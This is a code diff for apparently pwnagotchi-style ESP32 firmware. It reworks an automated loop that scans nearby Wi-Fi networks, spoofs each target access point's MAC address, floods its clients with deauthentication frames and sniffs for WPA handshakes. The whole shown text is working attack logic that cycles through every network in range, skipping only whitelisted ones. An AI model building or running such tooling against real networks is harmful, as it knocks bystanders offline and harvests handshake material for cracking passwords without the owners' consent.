@@ -85,8 +85,6 @@ void speedScanCallback(void* buf, wifi_promiscuous_pkt_type_t type){
 
 void speedScan(){
     logMessage("Starting speed scan...");
-    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
-    esp_wifi_set_promiscuous_filter(&filter);
     g_speedScanResults.clear();
     //go quickly through channels 1-13
     esp_wifi_set_promiscuous(true);
@@ -222,42 +220,56 @@ uint8_t wifiCheckInt = 0;
 
 void pwnagothiLoop(){
     if(pwnagothiScan){
-        logMessage("(<_>) Scanning..");
-        setMood(1, "(<_>)", "Scanning..");
+        logMessage("(<_>) Speed scanning..");
+        setMood(1, "(<_>)", "Speed scanning..");
         updateUi(true, false);
-        WiFi.scanNetworks();
-        if((WiFi.scanComplete()) >= 0){
+        g_speedScanResults.clear();
+        // run promiscuous fast scan
+        speedScan();
+        if(!g_speedScanResults.empty()){
             wifiCheckInt = 0;
             pwnagothiScan = false;
-            logMessage("(*_*) Scan compleated proceding to attack!");
-            setMood(1, "(*_*)", "Scan compleated proceding to attack!");
+            logMessage("(*_*) Speed scan completed proceding to attack!");
+            setMood(1, "(*_*)", "Speed scan completed proceding to attack!");
             updateUi(true, false);
             delay(pwnagotchi.delay_after_wifi_scan);
-        }
-    }
-    else{
-        setMood(1, "(z-z)", "waiting...");
-        updateUi(true, false);
-        delay(pwnagotchi.delay_before_switching_target);
-        String attackVector;
-        if(!WiFi.SSID(0)){
-            logMessage("('_') No networks found. Waiting and retrying");
+        } else {
+            logMessage("('_') No networks found by speed scan. Falling back to slow scan and retrying.");
             updateUi(true, false);
+            WiFi.scanNetworks();
             delay(pwnagotchi.delay_after_no_networks_found);
-            pwnagothiScan = true;
-        }
-        if(wifiCheckInt < WiFi.scanComplete()){
-            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
-        }
-        else{
             pwnagothiScan = true;
             return;
         }
-        attackVector = WiFi.SSID(wifiCheckInt);
+    }
+    else{
+        // ensure we have results and index is in range
+        if(g_speedScanResults.empty()){
+            logMessage("('_') No speed-scan results available, re-scheduling scan.");
+            pwnagothiScan = true;
+            return;
+        }
+        if(wifiCheckInt >= g_speedScanResults.size()){
+            logMessage("Reached end of speed-scan results, scheduling new scan.");
+            pwnagothiScan = true;
+            return;
+        }
+
+        auto &entry = g_speedScanResults[wifiCheckInt];
+        String attackVector = entry.ssid;
+        // handle empty SSID entry
+        if(attackVector.length() == 0){
+            logMessage("('_') Encountered hidden/empty SSID, skipping.");
+            wifiCheckInt++;
+            return;
+        }
+
         setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
         logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
         updateUi(true, false);
         delay(pwnagotchi.delay_after_picking_target);
+
+        // whitelist check
         std::vector<String> whitelistParsed = parseWhitelist();
         for (size_t i = 0; i < whitelistParsed.size(); ++i) {
             logMessage("Whitelist check...");
@@ -270,15 +282,20 @@ void pwnagothiLoop(){
                 return;
             }
         }
+
+        // prepare attack using speed-scan info
         updateUi(true, false);
-        setMac(WiFi.BSSID(wifiCheckInt));
+        setMac(&entry.bssid[0]);
         setMood(1 , "(@_@)", "WELL, Everyone is OUT!");
         updateUi(true, false);
-        setTargetAP(WiFi.BSSID(wifiCheckInt));
+        setTargetAP(&entry.bssid[0]);
+
+        uint16_t targetChannel = entry.channel ? entry.channel : 1;
         if(pwnagotchi.activate_sniffer_on_deauth){
-            SnifferBegin(WiFi.channel(wifiCheckInt));
+            SnifferBegin(targetChannel);
         }
-        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){//send_deauth_packets(clients[i], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
+
+        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
             logMessage("Deauth succesful, proceeding to sniff...");
         }
         else{
@@ -290,18 +307,23 @@ void pwnagothiLoop(){
                 return;
             }
         }
+
         setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
         logMessage("(@--@) Sniff, sniff... Looking for handshake...");
         updateUi(true, false);
         unsigned long startTime1 = millis();
+
         if(!pwnagotchi.activate_sniffer_on_deauth){
-            SnifferBegin(WiFi.channel(wifiCheckInt));
+            SnifferBegin(targetChannel);
         }
+
         while(true){
             SnifferLoop();
             updateUi(true, false);
             delay(10);
+
             if (SnifferGetClientCount() > 0) {
+                // ensure we consume pending packets
                 while (SnifferPendingPackets() > 0) {
                     SnifferLoop();
                     updateUi(true, false);
@@ -330,12 +352,13 @@ void pwnagothiLoop(){
                 delay(pwnagotchi.delay_after_successful_attack);
                 break;
             }
-            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) { // 20 seconds timeout
+
+            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
                 setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                 logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                 SnifferEnd();
                 updateUi(true, false);
-                
+
                 delay(pwnagotchi.delay_after_attack_fail);
                 if(pwnagotchi.add_to_whitelist_on_fail){
                     logMessage("Adding " + attackVector + " to whitelist");
@@ -352,11 +375,12 @@ void pwnagothiLoop(){
             }
         }
     }
+
     setMood(1, "(>_<)", "Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
     logMessage("(>_<) Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
     updateUi(true, false);
     delay(pwnagotchi.nap_time);
-} 
+}
 
 void pwnagothiStealthLoop(){
     if(pwnagothiScan){
